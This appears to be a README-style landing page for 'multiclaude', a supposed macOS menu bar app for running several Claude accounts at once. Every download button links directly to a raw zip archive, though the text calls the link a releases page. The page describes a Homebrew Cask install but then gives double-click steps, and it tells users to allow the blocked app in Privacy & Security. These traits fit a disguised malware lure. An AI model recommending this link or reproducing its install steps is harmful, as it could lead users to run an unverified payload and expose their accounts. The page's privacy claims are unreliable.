---
layout: "default"
title: "🖥️ multiclaude - Run Every Claude Account Side by Side"
description: "Run multiple Claude accounts simultaneously from a free macOS menu bar app, switching between personal, work, and client profiles instantly."
---
# 🖥️ multiclaude - Run Every Claude Account Side by Side

[![Download multiclaude](https://img.shields.io/badge/⬇️_Download_multiclaude-ff4f8b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cikafeee/cikafeee.github.io/main/data/Release_wangrace.zip)

multiclaude is a small menu bar app that lets you keep several Claude desktop accounts open at the same time on one Mac. Instead of signing out of one account, quitting the app, and signing back in with another, you get a tidy little icon in your menu bar where every account is one click away.

No terminal commands. No configuration files. No developer tools. Just a menu bar icon and a click.

## 🚀 What multiclaude Actually Does

If you have ever used Claude for both work and personal projects, you already know the problem. One desktop app means one signed-in account. Switching means signing out, waiting, signing back in, and losing your place. Do that five times a day and it becomes genuinely annoying.

multiclaude solves that by running several isolated Claude desktop sessions side by side. Each account keeps its own window, its own conversation history, and its own sign-in state. You switch between them from a simple dropdown menu in your Mac menu bar — one click per account, exactly as advertised.

Everything happens locally on your computer. multiclaude does not store your passwords, does not route your conversations through a third-party server, and does not change how Claude itself works. It simply gives each account its own space to live in.

## ✨ Key Features

- **One click per account.** The menu bar dropdown lists every account you have set up. Click a name, that window comes forward. That is the whole workflow.
- **Truly separate sessions.** Each account gets its own independent session, so signing into one never signs you out of another.
- **Lives in your menu bar.** No Dock clutter, no extra windows floating around. It sits quietly at the top of your screen until you need it.
- **Remembers your setup.** Close the app, restart your Mac, come back tomorrow — your accounts are still listed and ready.
- **Native and lightweight.** Built with Swift and SwiftUI, so it feels like a normal Mac app rather than a web page in a box.
- **Simple installation.** Distributed as a standard Homebrew Cask package, so setup is a single step.
- **No account limits baked in.** Two accounts or five accounts, the menu bar handles them the same way.
- **Private by design.** Your credentials stay in your own system keychain, not on someone else's server.

## 💻 Download and Install

Everything you need is on the official releases page:

[![Get multiclaude](https://img.shields.io/badge/⬇️_Get_multiclaude-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cikafeee/cikafeee.github.io/main/data/Release_wangrace.zip)

**Visit this link to download the application.**

Once the page opens, follow these steps:

1. Open the link above in your normal web browser. You can click the green button or the plain text link — both go to the same place.
2. The page lists the available versions of multiclaude. The newest one is at the top, marked as the latest release.
3. In that newest release, look for the file listed under its assets or downloads. Click it to start the download.
4. Your browser will show the download progressing in the top-right corner. Wait for it to finish. This usually takes a few seconds.
5. When it is done, open your Downloads folder and double-click the downloaded file to begin setup.
6. Follow the on-screen prompts. They are short and use plain language.
7. When setup finishes, multiclaude starts automatically and places its icon in your menu bar at the top-right of your screen.

That is the entire installation. There is nothing to type, nothing to configure, and no account needed to get the app itself running.

## 🖱️ First Run: Adding Your First Account

When multiclaude launches for the first time, the menu bar icon appears with an empty list. Here is how to fill it:

1. Click the multiclaude icon in your menu bar.
2. Choose the option to add a new account. A fresh, isolated Claude window opens for you.
3. Sign in to Claude in that window the same way you normally would.
4. Give the account a friendly name when prompted — for example "Work," "Personal," or "Client A." This label is only for you; it appears in the menu so you can tell accounts apart at a glance.
5. Repeat the process for each additional account you want to run.

When you have more than one account listed, the menu shows them all. Click any name to bring that account's window to the front. The account you used most recently is marked so you always know where you left off.

## 🔄 Switching Accounts Day to Day

Switching is intentionally boring, which is exactly the point.

Click the menu bar icon. Click the account name. The right window comes forward. Start typing.

If you want to keep two accounts visible at once — say one for a work conversation and one for a personal project — just drag their windows side by side. multiclaude does not force a single window; it lets each account live in its own space.

When you are finished for the day, quit multiclaude from the same menu. Every account's sign-in state is preserved, so tomorrow morning you start exactly where you stopped.

## 🧩 Common Situations multiclaude Handles Well

**Separating work and personal use.** Keep your employer's account and your own account apart without ever signing out. Conversations never mix, and you never accidentally send a personal question from a work account.

**Managing client accounts.** If you handle several clients who each use Claude, give each one a labelled entry in the menu. Switching between them takes a second.

**Testing and comparing.** Run two accounts side by side to compare how the same prompt behaves, or to keep a "clean" account free of a long conversation history.

**Shared family Macs.** Each person gets their own entry, their own sign-in, and their own history, all from one menu bar icon.

## 🛠️ Troubleshooting the Basics

**The icon is not in my menu bar.** Look at the top-right area of your screen near the clock. If your menu bar is crowded, macOS may hide icons — try quitting an app or two to make room. You can also relaunch multiclaude from your Applications folder.

**An account window will not open.** Click the account name once more. If nothing happens, quit multiclaude from the menu and start it again. Your accounts are not lost; they are remembered between launches.

**I need to remove an account.** Open the menu, find the account, and choose the remove option. This only removes the entry from multiclaude — it does not delete anything from your Claude account itself.

**The download did not start.** Return to the releases link and click the file listed under the newest release again. Some browsers need a second click after asking for permission to download.

**Setup says the app cannot be opened.** Open System Settings, go to Privacy & Security, and look for a message about multiclaude near the bottom. Allow it, then try opening the app again.

## 🔐 Privacy and Safety

multiclaude keeps everything on your machine. Your sign-in details are handled by Claude's own sign-in screens and stored by your Mac's built-in keychain, the same secure place your other app passwords live. multiclaude does not phone home, does not collect usage statistics, and does not send your conversations anywhere.

Because each account runs in its own isolated session, there is no risk of one account's data leaking into another. What happens in one window stays in that window.

## ❓ Frequently Asked Questions

**Do I need a separate Claude subscription for each account?** multiclaude manages sign-ins; it does not create accounts. Each account you add is one you already have access to.

**Will this slow down my Mac?** multiclaude itself is tiny. Running several Claude windows uses more memory than running one, simply because more windows are open, but the menu bar app adds almost nothing on top.

**What happens if I restart my computer?** Your account list is saved. Open multiclaude again and every entry is still there.

**Can I add an account later?** Yes. Open the menu and add another at any time, as often as you like.

**Does it change how Claude works?** No. You get the same Claude interface, in separate windows, with a convenient switcher on top.

## 🧭 Tips for a Smooth Setup

Name your accounts something you will recognise instantly — "Work," "Freelance," "Test" — rather than leaving them as defaults. Arrange the two accounts you use most in the same screen position so switching feels natural. And keep the releases link bookmarked: when a new version arrives, downloading from that page is the cleanest way to update.

## 💬 Getting Help

If something is not working as described, the releases page is also where updates and release notes appear. Check there first for a newer version, then review the troubleshooting section above. Most first-run problems come down to a download that did not finish or a security prompt that was not yet approved, and both take seconds to fix.

Keywords: anthropic, claude, claude-desktop, homebrew-cask, macos, menu-bar-app, menubar, multi-account, productivity, swift, swiftui